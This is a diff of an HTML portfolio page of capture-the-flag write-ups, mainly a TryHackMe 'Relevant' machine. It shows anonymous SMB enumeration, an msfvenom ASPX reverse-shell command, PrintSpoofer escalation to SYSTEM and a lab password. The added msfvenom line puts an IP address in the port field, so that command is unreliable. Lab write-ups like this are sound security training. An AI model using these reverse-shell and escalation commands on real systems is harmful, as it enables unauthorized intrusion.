@@ -274,9 +274,6 @@
                 <p>Then, I restarted the service with:</p>
                 <pre><code>sc start WiseBootAssistant</code></pre>
                 <p>When the service started, it executed the <strong>Wise.exe</strong> payload, which resulted in a <strong>SYSTEM shell</strong> being returned to me.</p>
-
-                <h2>Conclusion</h2>
-                <p>At this point, I had successfully escalated my privileges to <strong>SYSTEM</strong> and had full control of the machine. The combination of a <strong>Jenkins brute force attack</strong>, <strong>reverse shell through Jenkins</strong>, and exploiting the <strong>unquoted service path vulnerability</strong> in <strong>WiseCare</strong> allowed me to gain full access and escalate privileges on the <strong>Butler</strong> machine.</p>
             </div>
             <div class="subsection" onclick="toggleSubsection('ctf2')">Blackpearl (TCM Security)</div>
             <div id="ctf2" class="subsection-content ctf-content">
@@ -319,13 +316,17 @@
             </div>
             <div class="subsection" onclick="toggleSubsection('ctf-relevant')">RELEVANT (TryHackMe)</div>
             <div id="ctf-relevant" class="subsection-content ctf-content">
+                <h2>Tactics Covered</h2>
+                <p>Active Directory enumeration via SMB, ASPX reverse shells, Windows privilege escalation using SeImpersonatePrivilege (PrintSpoofer)</p>
                 <h2>Initial Enumeration</h2>
                 <ul>
+                    <li>Enumerated SMB shares anonymously using <pre><code>smbclient -L 10.10.230.117 -N</code></pre></li>
                     <li>Found a custom SMB share: <code>nt4wrksv</code></li>
                     <li>Domain name: <strong>RELEVANT</strong></li>
                     <li>SMB signing was <strong>disabled</strong></li>
                     <li>Anonymous and guest access was allowed to the <code>nt4wrksv</code> share</li>
                 </ul>
+                <img src="Images/relevant_smbclient">
             
                 <h2>Credentials Discovered</h2>
                 <ul>
@@ -333,7 +334,7 @@
                     <li>Bill: <code>Juw4nnaM4n420696969!$$$</code></li>
                 </ul>
             
-                <p>Only Bob was a valid low-privilege user — others were guest or had no access.</p>
+                <p>Unfortunately initial post-compromise techniques such as Kerberoasting, AS-REP Roasting, and secretsdump yielded no viable attack paths or privilege escalation opportunities.</p>
             
                 <h2>Web Enumeration</h2>
                 <ul>
@@ -341,21 +342,22 @@
                     <li>Discovered <code>nt4wrksv</code> in web directories — linked to SMB share</li>
                     <li>Confirmed upload access via SMB to the web root</li>
                 </ul>
-            
+                
                 <h2>Exploitation</h2>
-                <p>Uploaded an <strong>ASPX reverse shell</strong> using SMB — ideal for IIS/ASP.NET targets.</p>
-                <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=&lt;your IP&gt; LPORT=&lt;your port&gt; -f aspx > shell.aspx</code></pre>
+                <p>Uploaded an <strong>ASPX reverse shell</strong> using SMB which is ideal for IIS/ASP.NET targets.</p>
+                <pre><code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.230.117 LPORT=10.6.36.131 -f aspx > shell.aspx</code></pre>
                 <p>Triggered the reverse shell through the exposed web path tied to <code>nt4wrksv</code>.</p>
-            
+                <img src="Images/relevant_priv">
+                
                 <h2>Privilege Escalation</h2>
                 <ul>
                     <li>Token impersonation attempts failed</li>
                     <li>Attempted PrintNightmare exploit — caught by AV, even with a custom DLL</li>
                     <li>Used <strong>PrintSpoofer</strong> successfully — achieved <strong>NT AUTHORITY\SYSTEM</strong></li>
                 </ul>
-            
-                <h2>Conclusion</h2>
-                <p>Compromised the box using a mix of SMB misconfigurations, ASPX shell upload, and PrintSpoofer for privilege escalation.</p>
+                <p><pre><code>PrintSpoofer64.exe -i -c cmd</code></pre></p>
+                <img src="Images/relevant_nt_authority">
+
             </div>
             <div class="subsection" onclick="toggleSubsection('ctf3')">Coming soon!</div>
             <div id="ctf3" class="subsection-content ctf-content">
